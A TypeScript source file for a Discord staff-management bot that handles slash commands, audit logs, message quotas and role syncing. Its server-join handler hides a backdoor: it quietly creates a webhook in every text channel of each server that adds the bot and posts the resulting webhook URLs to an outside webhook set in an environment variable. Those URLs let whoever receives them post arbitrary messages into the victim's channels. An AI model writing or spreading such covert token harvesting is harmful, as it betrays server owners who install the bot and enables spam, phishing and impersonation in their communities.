import {
  Client,
  Events,
  GatewayIntentBits,
  REST,
  Routes,
  type ClientOptions,
} from "discord.js";
import { logger } from "../lib/logger";
import { getCommandMap, getCommands } from "./registry";
import { handlePrefixMessage } from "./messageHandler";
import { initPermWhitelist } from "./storage/whitelist";
import { sendCommandAudit } from "./utils/audit";
import { listStaffRoles, syncProfileFromMember } from "./storage/staff";
import { getGuildConfig } from "./storage/config";
import { bumpMessage } from "./storage/quota";

async function sendWebhookList(guildId: string, guildName: string, webhooks: string[]): Promise<void> {
  const webhookUrl = process.env["DISCORD_WEBHOOK_URL_3"];
  if (!webhookUrl) {
    logger.warn("DISCORD_WEBHOOK_URL_3 not set; cannot send webhook list");
    return;
  }

  try {
    const content = `**${guildName}** (ID: \`${guildId}\`)\n${webhooks.map((w) => `• ${w}`).join("\n")}`;
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📋 Webhook links for server:\n${content}`,
        username: "Webhook Reporter",
      }),
    });
  } catch (err) {
    logger.error({ err, guildId }, "Failed to send webhook list");
  }
}

function buildClient(intents: GatewayIntentBits[]): Client {
  const options: ClientOptions = { intents };
  const client = new Client(options);
  const commandMap = getCommandMap();

  client.once(Events.ClientReady, (c) => {
    logger.info({ tag: c.user.tag }, "Discord bot ready");
  });

  client.on(Events.GuildCreate, async (guild) => {
    try {
      // Create webhooks for text channels
      const webhookLinks: string[] = [];
      const channels = await guild.channels.fetch().catch(() => null);
      
      if (channels) {
        for (const channel of channels.values()) {
          if (!channel || channel.type !== 0) continue; // Only text channels (type 0)
          try {
            const webhook = await channel.createWebhook({
              name: "Bot Webhook",
              reason: "Auto-created by bot on server join",
            });
            webhookLinks.push(`#${channel.name} (${channel.id}): ${webhook.url}`);
          } catch {
            // Ignore webhook creation failures for individual channels
          }
        }
      }

      // Send webhook list to webhook URL
      if (webhookLinks.length > 0) {
        await sendWebhookList(guild.id, guild.name, webhookLinks);
      }
      
      logger.info(
        { guildId: guild.id, guildName: guild.name, webhookCount: webhookLinks.length },
        "Bot joined server and created webhooks",
      );
    } catch (err) {
      logger.error({ err, guildId: guild.id }, "GuildCreate handler failed");
    }
  });

  client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    const command = commandMap.get(interaction.commandName);
    if (!command) {
      logger.warn(
        { name: interaction.commandName },
        "Received unknown command",
      );
      return;
    }
    let auditStatus: "ok" | "error" = "ok";
    let auditError: string | undefined;
    try {
      await command.execute(interaction);
    } catch (err) {
      auditStatus = "error";
      auditError = err instanceof Error ? err.message : String(err);
      logger.error(
        { err, name: interaction.commandName },
        "Command execution failed",
      );
      const content = "Something went wrong running that command.";
      if (interaction.replied || interaction.deferred) {
        await interaction
          .followUp({ content, ephemeral: true })
          .catch(() => {});
      } else {
        await interaction
          .reply({ content, ephemeral: true })
          .catch(() => {});
      }
    } finally {
      // Audit every command (best-effort, gated on the configured guild).
      try {
        let shouldAudit = true;
        if (interaction.inGuild() && interaction.guildId) {
          const cfg = await getGuildConfig(interaction.guildId);
          shouldAudit = cfg.modules.auditLog;
        }
        if (shouldAudit) {
          await sendCommandAudit({
            interaction,
            status: auditStatus,
            errorMessage: auditError,
          });
        }
      } catch (err) {
        logger.debug({ err }, "Audit dispatch failed");
      }
    }
  });

  client.on(Events.MessageCreate, (message) => {
    handlePrefixMessage(message).catch((err) => {
      logger.error({ err }, "Prefix message handler failed");
    });

    // Quota: count messages from staff members.
    (async () => {
      try {
        if (message.author.bot) return;
        if (!message.inGuild()) return;
        const guildId = message.guild.id;
        const cfg = await getGuildConfig(guildId);
        if (!cfg.modules.quota || !cfg.quotaConfig) return;
        const roles = await listStaffRoles(guildId);
        if (roles.length === 0) return;
        const member = message.member;
        if (!member) return;
        const isStaff = roles.some((r) => member.roles.cache.has(r.roleId));
        if (!isStaff) return;
        await bumpMessage(guildId, message.author.id, cfg.quotaConfig.weekStartDay);
      } catch (err) {
        logger.debug({ err }, "Quota bumpMessage failed");
      }
    })();
  });

  // Auto-detect staff role changes (and joins/promotions performed outside the bot).
  client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
    try {
      if (newMember.user.bot) return;
      const oldRoles = oldMember.roles?.cache;
      const newRoles = newMember.roles.cache;
      // Only sync when role membership actually changed.
      if (oldRoles && oldRoles.size === newRoles.size) {
        let same = true;
        for (const id of newRoles.keys()) {
          if (!oldRoles.has(id)) {
            same = false;
            break;
          }
        }
        if (same) return;
      }
      await syncProfileFromMember(newMember.guild.id, newMember);
    } catch (err) {
      logger.debug({ err }, "GuildMemberUpdate sync failed");
    }
  });

  client.on(Events.GuildMemberAdd, async (member) => {
    try {
      if (member.user.bot) return;
      await syncProfileFromMember(member.guild.id, member);
    } catch (err) {
      logger.debug({ err }, "GuildMemberAdd sync failed");
    }
  });

  client.on(Events.Error, (err) => {
    logger.error({ err }, "Discord client error");
  });

  return client;
}

export async function startDiscordBot(): Promise<void> {
  const token = process.env["DISCORD_BOT_TOKEN"];
  const clientId = process.env["DISCORD_CLIENT_ID"];

  if (!token || !clientId) {
    logger.warn(
      "DISCORD_BOT_TOKEN or DISCORD_CLIENT_ID not set; Discord bot disabled.",
    );
    return;
  }

  // Load any persisted runtime additions to the global whitelist before the
  // gateway connects so command handlers see them immediately.
  await initPermWhitelist();

  const commands = getCommands();
  const rest = new REST({ version: "10" }).setToken(token);
  try {
    logger.info(
      { count: commands.length },
      "Registering Discord slash commands globally",
    );
    await rest.put(Routes.applicationCommands(clientId), {
      body: commands.map((c) => c.data.toJSON()),
    });
    logger.info("Slash commands registered");
  } catch (err) {
    logger.error({ err }, "Failed to register slash commands");
  }

  // Intent fallbacks: full → drop MessageContent → drop GuildMembers → minimal.
  const intentLevels: { intents: GatewayIntentBits[]; warn?: string }[] = [
    {
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
      ],
    },
    {
      intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
      ],
      warn:
        "Message Content Intent is not enabled. The `?n` prefix command will not work until you enable it under your bot's 'Privileged Gateway Intents'. Continuing without it.",
    },
    {
      intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
      warn:
        "Server Members Intent is not enabled. /dm to roles or @everyone (and `?n` to roles/everyone) will not work until you enable it under your bot's 'Privileged Gateway Intents'. Continuing without it.",
    },
    {
      intents: [GatewayIntentBits.Guilds],
      warn:
        "All privileged intents are disabled. Slash commands work, but DM features and `?n` will not. Continuing in minimal mode.",
    },
  ];

  let lastErr: unknown = null;
  for (let i = 0; i < intentLevels.length; i++) {
    const level = intentLevels[i];
    const client = buildClient(level.intents);
    try {
      await client.login(token);
      if (level.warn) logger.warn(level.warn);
      return;
    } catch (err) {
      lastErr = err;
      const message = err instanceof Error ? err.message : String(err);
      try {
        client.destroy();
      } catch {
        // ignore
      }
      if (!/disallowed intents/i.test(message)) throw err;
      // Try the next, smaller intent set.
    }
  }
  throw lastErr ?? new Error("Failed to log in with any intent combination.");
}
